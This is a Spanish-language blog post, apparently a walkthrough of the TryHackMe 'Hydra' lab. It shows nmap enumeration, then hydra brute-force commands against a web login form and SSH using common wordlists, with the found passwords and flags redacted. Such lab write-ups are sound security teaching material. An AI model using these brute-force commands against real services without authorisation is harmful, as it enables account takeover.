@@ -1,0 +1,177 @@
+<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Try Hack Me - Hydra - Writeup" /><meta property="og:locale" content="es_ES" /><meta name="description" content="En esta guía vamos a resolver el room Hydra de THM creado por cmnatic en el que utilizaremos hydra como herramienta (no se podía saber)." /><meta property="og:description" content="En esta guía vamos a resolver el room Hydra de THM creado por cmnatic en el que utilizaremos hydra como herramienta (no se podía saber)." /><link rel="canonical" href="https://ewan67.github.io/posts/thm-writeup-hydra/" /><meta property="og:url" content="https://ewan67.github.io/posts/thm-writeup-hydra/" /><meta property="og:site_name" content="ewan67" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-20T02:30:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Try Hack Me - Hydra - Writeup" /><meta name="twitter:site" content="@ewan674" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-20T02:30:00+01:00","datePublished":"2022-09-20T02:30:00+01:00","description":"En esta guía vamos a resolver el room Hydra de THM creado por cmnatic en el que utilizaremos hydra como herramienta (no se podía saber).","headline":"Try Hack Me - Hydra - Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://ewan67.github.io/posts/thm-writeup-hydra/"},"url":"https://ewan67.github.io/posts/thm-writeup-hydra/"}</script><title>Try Hack Me - Hydra - Writeup | ewan67</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ewan67"><meta name="application-name" content="ewan67"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/ewan67-avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ewan67</a></div><div class="site-subtitle font-italic">La verdadera ignorancia no es la ausencia de conocimiento, sino la negativa a adquirirlo.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ewan67" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ewan674" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ewan67','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Try Hack Me - Hydra - Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Try Hack Me - Hydra - Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1663637400" data-df="YYYY-MM-DD" data-toggle="tooltip" data-placement="bottom"> 2022-09-20 </em> </span><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://twitter.com/ewan674">ewan67</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="936 palabras"> <em>5 min</em> de lectura</span></div></div></div><div class="post-content"><p>En esta guía vamos a resolver el room <a href="https://tryhackme.com/room/hydra">Hydra</a> de <a href="https://tryhackme.com">THM</a> creado por <a href="https://tryhackme.com/p/cmnatic">cmnatic</a> en el que utilizaremos <strong>hydra</strong> como herramienta (no se podía saber).</p><p>Dentro música.</p><h2 id="inicio"><span class="mr-2">Inicio</span><a href="#inicio" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Para empezar, nos leemos con atención la descripción que acompaña la tarea 2 del room en la cual nos dan:</p><ul><li>las claves de los comandos que deberemos utilizar.<li>el nombre de un usuario.</ul><p>Iniciamos la máquina y enumeramos con <strong>nmap</strong>.</p><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>En este caso, tiramos de la flag <code class="language-plaintext highlighter-rouge">-A</code>  para hacer un escaneo completo.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-A</span> 10.10.192.81 <span class="nt">-oN</span> nmap_output           
+<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 14:59 CEST
+Nmap scan report for 10.10.192.81
+Host is up (0.035s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+</span><span class="gp">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey: 
+|   2048 c2:e5:6c:35:f3:62:07:77:d7:af:37:b9:b2:c8:5e:22 (RSA)
+|   256 ef:61:6c:5e:04:db:87:61:02:60:0e:9e:d5:06:9f:9c (ECDSA)
+|_  256 56:7e:6b:54:4c:26:22:ec:f4:1c:23:ed:85:b6:b2:34 (ED25519)
+80/tcp open  http    Node.js Express framework
+| http-title: Hydra Challenge
+|_Requested resource was /login
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
+</span></pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-A</code> : escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)<li><code class="language-plaintext highlighter-rouge">-oN</code> : imprime la salida en un fichero de texto con el nombre <em>nmap_output</em></ul><p>El volcado de <strong>nmap</strong> nos cuenta que tenemos dos puertos abiertos:</p><ul><li><em>22/tcp</em> con un servicio <strong>ssh</strong> escuchando.<li><em>80/tcp</em> con un servicio <strong>http</strong> escuchando.</ul><h2 id="http"><span class="mr-2">HTTP</span><a href="#http" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Abrimos un navegador y cargamos la IP del room.</p><p>Nos aparece la página de login.</p><p><img data-src="/assets/posts/20220920/img01.png" alt="" data-proofer-ignore></p><p>OK. En una nueva ventana de terminal buscamos un diccionario para utilizar con <strong>hydra</strong> contando con que tenemos un nombre de usuario.</p><blockquote><p><strong>Tip:</strong> Leeros el Hint de la primer pregunta. Yo no lo hice.</p></blockquote><p><br /></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cd</span> /usr/share/seclists/
+<span class="go">
+┌──(ewan67㉿kali)-[/usr/share/seclists]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">ls</span>              
+<span class="go">Discovery  Fuzzing  IOCs  Miscellaneous  Passwords  Pattern-Matching  Payloads  README.md  Usernames  Web-Shells
+
+┌──(ewan67㉿kali)-[/usr/share/seclists]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cd </span>Passwords           
+<span class="go">
+┌──(ewan67㉿kali)-[/usr/share/seclists/Passwords]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 258624
+drwxr-xr-x 12 root root    12288 Aug  3 08:19 .
+drwxr-xr-x 11 root root     4096 Aug  3 08:19 ..
+-rw-r--r--  1 root root     1621 Aug  2 11:51 2020-200_most_used_passwords.txt
+[...]
+</span></pre></table></code></div></div><p>Me quedo con el primero, <em>2020-200_most_used_passwords</em>  suena suficiente para empezar.</p><p>Volvemos al terminal de la carpeta de trabajo y lanzamos <strong>hydra</strong>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
+</span><span class="gp">└─$</span><span class="w"> </span>hydra <span class="nt">-l</span> molly <span class="nt">-P</span> /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 10.10.192.81 http-post-form <span class="s2">"/login:username=^USER^&amp;password=^PASS^:F=incorrect"</span> <span class="nt">-V</span>
+<span class="go">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 15:33:15
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
+[DATA] attacking http-post-form://10.10.192.81:80/login:username=^USER^&amp;password=^PASS^:F=incorrect
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "123456" - 1 of 200 [child 0] (0/0)
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "123456789" - 2 of 200 [child 1] (0/0)
+[...]
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "12345678" - 5 of 200 [child 4] (0/0)
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "aaaaaa" - 59 of 200 [child 2] (0/0)
+</span><span class="gp">[80][http-post-form] host: 10.10.192.81   login: molly   password: &lt;MODIFICADO&gt;</span><span class="w">
+</span><span class="go">1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 15:33:19
+</span></pre></table></code></div></div><p>Volvemos al navegador, introducimos las credenciales y obtenemos la primer flag.</p><p>Vamos a por la segunda.</p><h2 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Con la lección aprendida, cambiamos de diccionario y lanzamos el comando correspondiente al <em>ssh</em>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
+</span><span class="gp">└─$</span><span class="w"> </span>hydra <span class="nt">-l</span> molly <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.10.192.81 ssh <span class="nt">-V</span>
+<span class="go">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 15:59:18
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.192.81:22/
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[...]
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "jordan" - 35 of 14344400 [child 4] (0/1)
+[ATTEMPT] target 10.10.192.81 - login "molly" - pass "liverpool" - 36 of 14344400 [child 11] (0/1)
+</span><span class="gp">[22][ssh] host: 10.10.192.81   login: molly   password: &lt;MODIFICADO&gt;</span><span class="w">
+</span><span class="go">1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 15:59:26
+</span></pre></table></code></div></div><p>Tenemos la contraseña. Conectamos por <em>ssh</em>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
+</span><span class="gp">└─$</span><span class="w"> </span>ssh molly@10.10.192.81
+<span class="go">molly@10.10.192.81's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+32 updates are security updates.
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+</span><span class="gp">molly@ip-10-10-192-81:~$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">flag2.txt
+</span><span class="gp">molly@ip-10-10-192-81:~$</span><span class="w"> </span><span class="nb">cat </span>flag2.txt 
+<span class="gp">THM{&lt;MODIFICADO&gt;</span><span class="o">}</span>
+<span class="gp">molly@ip-10-10-192-81:~$</span><span class="w"> 
+</span></pre></table></code></div></div><p>Segunda flag y final de show.</p><p>Espero que esta guía os haya resultado de ayuda.</p><p>Sed buenos si no hay una opción mejor.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/try-hack-me/'>Try Hack Me</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Try+Hack+Me+-+Hydra+-+Writeup+-+ewan67&url=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-hydra%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Try+Hack+Me+-+Hydra+-+Writeup+-+ewan67&u=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-hydra%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-hydra%2F&text=Try+Hack+Me+-+Hydra+-+Writeup+-+ewan67" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-writeup-tier1-three/">Hack The Box - Starting Point - Tier 1 - Three Writeup</a><li><a href="/posts/thm-writeup-brooklyn-nine-nine/">Try Hack Me - Brooklyn Nine Nine - Writeup</a><li><a href="/posts/thm-writeup-anonymous/">Try Hack Me - Anonymous - Writeup</a><li><a href="/posts/thm-writeup-olympus/">Try Hack Me - Olympus - Writeup</a><li><a href="/posts/thm-writeup-agentt/">Try Hack Me - Agent T - Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/chirpy/">chirpy</a> <a class="post-tag" href="/tags/github-pages/">github pages</a> <a class="post-tag" href="/tags/hola-mundo/">hola mundo</a> <a class="post-tag" href="/tags/jekyll/">jekyll</a> <a class="post-tag" href="/tags/tutos/">tutos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm-writeup-brooklyn-nine-nine/"><div class="card-body"> <em class="small" data-ts="1660613400" data-df="YYYY-MM-DD" > 2022-08-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Brooklyn Nine Nine - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina Brooklyn Nine Nine disponible en THM, un sencillo CTF creado por Fsociety2006 en el que pondremos en práctica técnicas de enumeración, esteganografía y ...</p></div></div></a></div><div class="card"> <a href="/posts/thm-writeup-anonymous/"><div class="card-body"> <em class="small" data-ts="1660649400" data-df="YYYY-MM-DD" > 2022-08-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Anonymous - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina Anonymous disponible en THM, un CTF de dificultad media creado por Nameless0ne en el que pondremos en práctica técnicas de enumeración y escalado de pri...</p></div></div></a></div><div class="card"> <a href="/posts/thm-writeup-b3dr0ck/"><div class="card-body"> <em class="small" data-ts="1662600600" data-df="YYYY-MM-DD" > 2022-09-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - b3dr0ck - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina b3dr0ck disponible en THM, un sencillo CTF creado por F11snipe en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utiliz...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thm-writeup-intermediate-nmap/" class="btn btn-outline-primary" prompt="Anterior"><p>Try Hack Me - Intermediate Nmap - Writeup</p></a> <a href="/posts/thm-writeup-ignite/" class="btn btn-outline-primary" prompt="Nuevo"><p>Try Hack Me - Ignite - Writeup</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ewan674">ewan67</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/chirpy/">chirpy</a> <a class="post-tag" href="/tags/github-pages/">github pages</a> <a class="post-tag" href="/tags/hola-mundo/">hola mundo</a> <a class="post-tag" href="/tags/jekyll/">jekyll</a> <a class="post-tag" href="/tags/tutos/">tutos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
